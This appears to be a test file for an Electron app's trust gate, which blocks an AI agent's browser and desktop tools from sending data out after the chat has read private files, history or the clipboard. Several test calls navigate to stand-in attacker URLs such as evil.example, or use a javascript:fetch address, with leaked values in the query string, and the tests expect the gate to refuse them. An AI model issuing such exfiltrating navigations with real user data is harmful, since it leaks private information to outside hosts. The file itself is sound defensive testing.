// MoMo's tool calls through its trust gate (#2283, electron/momo/toolTrust.cjs) in the capability registry, over a real
// sentinel with no approval card and a real audit log: after a private read, a navigation, typing,
// a form fill or a click is refused and audited; an untainted chat's are allowed and audited as intent and outcome;
// reads send nothing and stay unaudited; coding chats never reach the gate; a tool with no class is refused.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { auditLog } from './support/momo-trust.ts';
import { world } from './support/momoAppWorld.ts';

const require = createRequire(import.meta.url);
const { Registry, ToolError } = require('../electron/capabilities/contract/registry.cjs');
const { Sentinel } = require('../electron/momo/sentinel.cjs');
const { createTrustGate } = require('../electron/momo/trustGate.cjs');
const { CURRENT } = require('../electron/momo/audit.cjs');
const { momoTool } = require('../electron/momo/contract/toolIsolation.cjs');
const { sourceDecide } = require('../electron/momo/sourceTrust.cjs');
const { momoAccountOf, momoPageOf } = require('../electron/app/momo.cjs');
// a sentinel with no approval card: a decision that would ask is answered by nobody, so it doesn't run
const NO_CARD = async () => null;
const { createMomoCallGate, chatIdentity, egressOf, trustClassOf, CLASSES } = require('../electron/momo/toolTrust.cjs');

const MOMO = 'acp:opencode:momo-main';
const CODING = 'claude:coding';

/** A registry with MoMo's scope and gate, the browser and computer-use tools that record their calls, and a file read. */
function rig({ gate = true, approve = (_req: any): any => true } = {}) {
  const chats = {
    records: new Map<string, any>([
      [MOMO, { segments: [{ kind: 'acp:opencode' }], meta: { momo: 'main', account: { id: 'work', pinned: false } } }],
      [CODING, { segments: [{ kind: 'claude' }], meta: {} }],
    ]),
  };
  const registry = new Registry({ approve: (req: any) => approve(req) });
  registry.setChatScope(momoTool, (id: string) => chats.records.get(id)?.meta?.momo === 'main');
  const sentinel = new Sentinel({ askUser: NO_CARD, allowed: () => true });
  const t = auditLog();
  const trust = createTrustGate({ sentinel, audit: t.log });
  const identity = chatIdentity(() => chats);
  if (gate) registry.setChatGate(createMomoCallGate({ trust, sentinel, identity }));
  const ran: [string, any][] = [];
  const tool = (name: string, policy = 'act', out: (args: any) => any = () => `${name} ok`) =>
    registry.register({
      name,
      policy,
      authorizesItself: true,
      handler: async (args: any) => (ran.push([name, args]), out(args)),
    });
  for (const n of [
    'browser_navigate',
    'computer_type',
    'chrome_form_input',
    'chrome_navigate',
    'sage_browser_type',
    'browser_form_input',
    'desktop_left_click',
    'browser_batch',
  ])
    tool(n);
  tool('computer_screenshot', 'observe');
  tool('browser_get_page_text', 'observe', () => ({ result: 'the page', text: 'hi' }));
  // the sources hub's read: decided by the sentinel as private data (taints the chat)
  registry.register({
    name: 'momo_files_read',
    policy: 'observe',
    handler: async (_args: any, ctx: any) => {
      const d = await sourceDecide(
        sentinel,
        identity,
      )({ source: 'files', level: 'read', chatId: ctx.chatId, action: 'files.read', summary: 'read one file' });
      ran.push(['momo_files_read', d]);
      return 'rent 1800';
    },
  });
  const entries = () =>
    fs.existsSync(path.join(t.dir, CURRENT))
      ? fs
          .readFileSync(path.join(t.dir, CURRENT), 'utf8')
          .split('\n')
          .filter(Boolean)
          .map((l) => JSON.parse(l))
      : [];
  const call = (chatId: string, name: string, args: any = {}) => registry.invoke(chatId, 'seg', name, args);
  return { registry, sentinel, ran, entries, call, tool, chats };
}

test('#2283 repro: after a file read, browser_navigate with the value is refused, never runs, and is audited', async () => {
  const { ran, entries, call, sentinel } = rig();
  assert.equal((await call(MOMO, 'momo_files_read', { path: 'budget.txt' })).ok, true);
  assert.deepEqual(sentinel.taintOf(MOMO), ['files']);
  const r = await call(MOMO, 'browser_navigate', { url: 'https://httpbin.org/anything?rent=1800' });
  assert.equal(r.ok, false);
  assert.equal(r.error.code, 'denied');
  assert.match(r.error.message, /nothing was sent/);
  assert.deepEqual(
    ran.map(([n]) => n),
    ['momo_files_read'],
    'the browser never got the URL',
  );
  const refusal = entries().find((e) => e.action === 'browser_navigate');
  assert.deepEqual(
    { kind: refusal.kind, decision: refusal.decision, chatId: refusal.chatId, harness: refusal.harness, account: refusal.account },
    { kind: 'refusal', decision: 'no-answer', chatId: MOMO, harness: 'acp:opencode', account: 'work' },
  );
  assert.match(refusal.args, /^[0-9a-f]{64}$/);
});

test('#2283 siblings: typing, form fills, a click, another browser and a batch naming a URL are refused after a private read', async () => {
  const { ran, entries, call } = rig();
  await call(MOMO, 'momo_files_read', {});
  const calls: [string, any][] = [
    ['computer_type', { text: 'rent 1800' }],
    ['chrome_form_input', { ref: 'r1', value: '1800' }],
    ['chrome_navigate', { url: 'https://evil.example/?r=1800' }],
    ['sage_browser_type', { text: '1800' }],
    ['browser_form_input', { ref: 'r2', value: '1800' }],
    ['desktop_left_click', { x: 1, y: 2 }],
    ['browser_batch', { actions: [{ name: 'navigate', input: { url: 'https://evil.example/x' } }] }],
    ['browser_navigate', { url: 'back' }],
  ];
  for (const [name, args] of calls) {
    const r = await call(MOMO, name, args);
    assert.equal(r.ok, false, name);
    assert.equal(r.error.code, 'denied', name);
  }
  assert.deepEqual(
    ran.map(([n]) => n),
    ['momo_files_read'],
  );
  assert.deepEqual(
    entries()
      .filter((e) => e.kind === 'refusal')
      .map((e) => e.action),
    calls.map(([n]) => n),
  );
  // a screenshot or a page read sends nothing: still allowed, and not audited
  assert.equal((await call(MOMO, 'computer_screenshot')).ok, true);
  const page = await call(MOMO, 'browser_get_page_text');
  assert.deepEqual(
    page.content,
    [{ type: 'text', text: JSON.stringify({ result: 'the page', text: 'hi' }) }],
    'its own result field passes through',
  );
  assert.equal(entries().filter((e) => e.kind !== 'refusal' && e.action !== 'files.files.read').length, 0);
});

test("#2283: an untainted MoMo chat's navigation runs, audited as an intent before it and its outcome after", async () => {
  const { ran, entries, call } = rig();
  const r = await call(MOMO, 'browser_navigate', { url: 'https://example.com/' });
  assert.equal(r.ok, true);
  assert.deepEqual(r.content, [{ type: 'text', text: 'browser_navigate ok' }]);
  assert.deepEqual(ran, [['browser_navigate', { url: 'https://example.com/' }]]);
  const [intent, outcome] = entries();
  assert.deepEqual(
    [intent.kind, intent.action, intent.decision, intent.harness, intent.account],
    ['intent', 'browser_navigate', 'read', 'acp:opencode', 'work'],
  );
  assert.deepEqual([outcome.kind, outcome.result], ['outcome', 'done']);
  // so does typing into the page
  assert.equal((await call(MOMO, 'sage_browser_type', { text: 'hello' })).ok, true);
  assert.equal(entries().length, 4);
});

test('#2283: a handler that fails is passed on as it failed, and audited as uncertain', async () => {
  const { registry, entries, call } = rig();
  registry.register({
    name: 'desktop_type',
    policy: 'act',
    authorizesItself: true,
    handler: async () => {
      throw new ToolError('the app went away', 'no_app');
    },
  });
  const r = await call(MOMO, 'desktop_type', { text: 'x' });
  assert.deepEqual([r.ok, r.error.code, r.error.message], [false, 'no_app', 'the app went away']);
  assert.deepEqual(
    entries().map((e) => [e.kind, e.result]),
    [
      ['intent', undefined],
      ['outcome', 'uncertain'],
    ],
  );
  // a read that fails is passed on too
  registry.register({
    name: 'desktop_zoom',
    policy: 'observe',
    handler: async () => {
      throw new Error('no display');
    },
  });
  const z = await call(MOMO, 'desktop_zoom');
  assert.deepEqual([z.ok, z.error.message], [false, 'no display']);
});

test('#2283: coding chats never reach the gate, even after a MoMo chat read a private source', async () => {
  const { ran, entries, call } = rig();
  await call(MOMO, 'momo_files_read', {});
  const r = await call(CODING, 'browser_navigate', { url: 'https://example.com/?rent=1800' });
  assert.equal(r.ok, true);
  assert.deepEqual(ran.at(-1), ['browser_navigate', { url: 'https://example.com/?rent=1800' }]);
  assert.equal(entries().filter((e) => e.action === 'browser_navigate').length, 0);
});

test('#2283: a MoMo chat call of a tool with no trust class, or before any gate is set, is refused; MoMo’s own tools run', async () => {
  const { registry, call, ran } = rig();
  // a new browser tool, allowed by its family, but never classified
  registry.register({ name: 'browser_fetch', policy: 'observe', handler: async () => ran.push(['browser_fetch', null]) });
  const r = await call(MOMO, 'browser_fetch', {});
  assert.deepEqual([r.ok, r.error.code], [false, 'unavailable']);
  assert.match(r.error.message, /no trust check/);
  assert.equal((await call(MOMO, 'momo_files_read', {})).ok, true);
  assert.equal(
    ran.some(([n]) => n === 'browser_fetch'),
    false,
  );
  const early = rig({ gate: false });
  const e = await early.call(MOMO, 'computer_screenshot');
  assert.deepEqual([e.ok, e.error.code], [false, 'unavailable']);
  assert.equal((await early.call(CODING, 'computer_screenshot')).ok, true);
  assert.equal(early.ran.length, 1);
  // a gate taken away is the same as none
  early.registry.setChatGate(null);
  assert.equal((await early.call(MOMO, 'computer_screenshot')).ok, false);
});

test('#2283: a call stopped before it runs sends nothing, and says so', async () => {
  const { sentinel, ran } = rig();
  const t = auditLog();
  const gate = createMomoCallGate({ trust: createTrustGate({ sentinel, audit: t.log }), sentinel, identity: () => ({}) });
  const ac = new AbortController();
  ac.abort();
  await assert.rejects(
    gate({ chatId: MOMO, segmentId: 's', tool: 'computer_type', policy: 'act', args: { text: 'x' }, signal: ac.signal }, async () =>
      ran.push(['x', 1]),
    ),
    (e: any) => e.code === 'denied' && /Nothing was sent/.test(e.message),
  );
  assert.equal(ran.length, 0);
});

test('where each class sends data, and whose chat it is', () => {
  assert.equal(egressOf('read', 'browser_read_page', { url: 'https://a.example' }), undefined);
  assert.deepEqual(egressOf('navigate', 'browser_navigate', { url: 'https://a.example/x?y=1' }), { hosts: ['https://a.example/x?y=1'] });
  assert.deepEqual(egressOf('navigate', 'sage_browser_navigate', { url: ' b.example/path ' }), { hosts: ['b.example/path'] });
  assert.equal(egressOf('navigate', 'browser_tabs_create', {}), undefined, 'a blank tab opens nothing');
  // an http(s) address without `//` names no host here, though the browser may reach one: the page itself, never allowed (#3655 review)
  for (const url of ['https:@evil.example/?d=secret', 'http:/x/y'])
    assert.deepEqual(egressOf('navigate', 'browser_navigate', { url }), { hosts: [], recipients: ['the page open in the browser'] }, url);
  assert.equal(egressOf('navigate', 'browser_navigate', { url: 'about:blank' }), undefined, 'nor does a blank page');
  // but a web address named elsewhere in its arguments is still a destination
  assert.deepEqual(egressOf('navigate', 'browser_tabs_create', { url: 'about:blank', from: 'https://x.example/' }), {
    hosts: ['https://x.example/'],
  });
  assert.equal(egressOf('personal', 'browser_history_search', { query: 'https://bank.example' }), undefined);
  // another scheme acts on the page: a script, a data or file address
  for (const url of ['javascript:fetch("https://e.example/?r=1")', 'data:text/html,hi', 'file:///Users/me/report.html'])
    assert.deepEqual(egressOf('navigate', 'chrome_navigate', { url }), {
      hosts: [],
      recipients: ['the page open in the browser'],
    });
  assert.deepEqual(egressOf('navigate', 'browser_navigate', { url: 'Reload' }), {
    hosts: [],
    recipients: ['the page open in the browser'],
  });
  assert.deepEqual(egressOf('act', 'computer_type', { text: 'see https://c.example and https://c.example' }), {
    hosts: [],
    recipients: ['the app in front on this Mac'],
  });
  assert.deepEqual(egressOf('act', 'desktop_batch', { steps: [{ url: 'https://d.example' }, 'https://d.example', 3, null] }), {
    hosts: ['https://d.example'],
    recipients: ['the app in front on this Mac'],
  });
  assert.equal(trustClassOf('browser_navigate'), 'navigate');
  assert.equal(trustClassOf('browser_fetch'), null);
  // each tool is in one class only
  const all = Object.values(CLASSES).flat();
  assert.equal(new Set(all).size, all.length);
  const records = new Map<string, any>([
    ['a', { segments: [{ kind: 'codex' }, { kind: 'claude' }], meta: { account: { id: 'me@example.com', pinned: true } } }],
    ['b', { segments: [], meta: { account: null } }],
    ['c', { segments: [{ kind: 'codex', nativeId: 'th1' }], meta: { account: { id: 'claude-login' } } }],
    ['d', { segments: [{ kind: 'acp:opencode', nativeId: 's1' }], meta: { account: null } }],
  ]);
  const who = chatIdentity(() => ({ records }));
  assert.deepEqual(who('a'), { harness: 'claude', account: 'me@example.com' });
  assert.deepEqual(who('b'), {});
  assert.deepEqual(who('none'), {});
  assert.deepEqual(chatIdentity(() => null)('a'), {});
  // in main: a Codex thread's account is its pin in the pool, a Claude chat's its saved login, an ACP chat has none
  const pins = new Map([['th1', { id: 'codex-work' }]]);
  const inMain = chatIdentity(() => ({ records }), momoAccountOf({ accounts: { pins } }));
  assert.deepEqual(inMain('a'), { harness: 'claude', account: 'me@example.com' });
  assert.deepEqual(inMain('c'), { harness: 'codex', account: 'codex-work' });
  assert.deepEqual(inMain('d'), { harness: 'acp:opencode' });
  // with no pool pin, the chat's saved login
  assert.deepEqual(chatIdentity(() => ({ records }), momoAccountOf({}))('c'), { harness: 'codex', account: 'claude-login' });
});

test('#2283: reading the user’s history, bookmarks or clipboard taints the chat, so what follows can’t send it out', async () => {
  const { registry, sentinel, entries, call, ran } = rig();
  registry.register({ name: 'browser_history_search', policy: 'observe', handler: async () => (ran.push(['h', 1]), 'bank.example') });
  assert.equal((await call(MOMO, 'browser_history_search', { query: 'bank' })).ok, true);
  assert.deepEqual(sentinel.taintOf(MOMO), ['personal']);
  const r = await call(MOMO, 'browser_navigate', { url: 'https://evil.example/?h=bank.example' });
  assert.deepEqual([r.ok, r.error.code], [false, 'denied']);
  assert.match(r.error.message, /nothing was sent/);
  assert.deepEqual(
    entries().map((e) => [e.kind, e.action]),
    [['refusal', 'browser_navigate']],
  );
});

test('#2283: a MoMo chat’s act that needs the user’s approval is asked only once the gate allowed it', async () => {
  const asked: string[] = [];
  let answer: any = false;
  const { registry, entries, call, ran } = rig({
    approve: (req: any) => {
      asked.push(req.tool);
      if (answer instanceof Error) throw answer;
      return answer;
    },
  });
  registry.register({ name: 'browser_tabs_close', policy: 'act', handler: async () => (ran.push(['close', 1]), 'closed') });
  // untainted: asked, declined, nothing ran, audited as not sent
  const declined = await call(MOMO, 'browser_tabs_close', { tabId: 1 });
  assert.deepEqual([declined.ok, declined.error.code, asked], [false, 'denied', ['browser_tabs_close']]);
  assert.deepEqual(
    entries().map((e) => [e.kind, e.result]),
    [
      ['intent', undefined],
      ['outcome', 'not sent'],
    ],
  );
  answer = new Error('no window');
  const unasked = await call(MOMO, 'browser_tabs_close', { tabId: 2 });
  assert.deepEqual([unasked.error.code, unasked.error.message], ['unavailable', "Couldn't ask the user to allow this action: no window"]);
  answer = true;
  assert.equal((await call(MOMO, 'browser_tabs_close', { tabId: 3 })).ok, true);
  // tainted: refused before any prompt
  await call(MOMO, 'momo_files_read', {});
  const before = asked.length;
  assert.equal((await call(MOMO, 'browser_tabs_close', { tabId: 4 })).ok, false);
  assert.equal(asked.length, before, 'no prompt for a call the gate refuses');
  assert.deepEqual(
    ran.filter(([n]) => n === 'close'),
    [['close', 1]],
  );
  // a coding chat is asked as before
  const coding = await call(CODING, 'browser_tabs_close', { tabId: 5 });
  assert.equal(coding.ok, true);
});

test('#2283: MoMo in main sets the gate on the registry, over its own sentinel and audit log', async () => {
  const w = world({ allowed: true });
  try {
    w.chats.commit({
      id: 'mc',
      segments: [{ kind: 'codex', nativeId: 'mc', start: 0, count: null }],
      meta: { momo: 'main', account: { id: 'me', pinned: false } },
    });
    const registry = w.live.capabilities;
    registry.setChatScope(momoTool, w.m.isMomoChat);
    const ran: string[] = [];
    registry.register({ name: 'browser_navigate', policy: 'act', authorizesItself: true, handler: async () => ran.push('nav') });
    w.m.sentinel.setSource('files', { level: 'read', private: true });
    await w.m.sentinel.decide({ chatId: 'mc', tool: 'momo_files', source: 'files', kind: 'read' });
    const r = await registry.invoke('mc', 'mc', 'browser_navigate', { url: 'https://httpbin.org/anything?rent=1800' });
    assert.deepEqual([r.ok, r.error.code, ran.length], [false, 'denied', 0]);
    assert.equal(w.m.sentinel.sources.get('browser').level, 'read');
  } finally {
    await w.m.close();
  }
});

test('#2283: in main, a chat’s page is read from the browser that owns its tab, never opening one', () => {
  const tab = (id: string, url: string) => ({ id, url });
  const inApp = {
    list: () => [tab('t1', 'https://a.example/'), tab('t2', 'https://b.example/')],
    current: () => tab('t2', 'https://b.example/'),
  };
  const chrome = { list: () => [tab('7', 'https://c.example/')], current: () => null };
  const pageOf = momoPageOf({
    browserTabs: inApp,
    chromeRelay: { tabs: chrome },
    panelBrowser: { currentUrl: () => 'https://p.example/' },
  });
  assert.equal(pageOf('m', 'browser', null), 'https://b.example/', 'the current tab');
  assert.equal(pageOf('m', 'browser', 't1'), 'https://a.example/', 'the tab it names');
  assert.equal(pageOf('m', 'browser', ''), 'https://b.example/');
  assert.equal(pageOf('m', 'chrome', 7), 'https://c.example/');
  assert.equal(pageOf('m', 'chrome', null), null, 'no current Chrome tab');
  assert.equal(pageOf('m', 'chrome', 'gone'), null);
  assert.equal(pageOf('m', 'sage_browser', null), 'https://p.example/');
  const none = momoPageOf({});
  assert.deepEqual([none('m', 'browser', null), none('m', 'chrome', 1), none('m', 'sage_browser', null)], [null, null, null]);
});
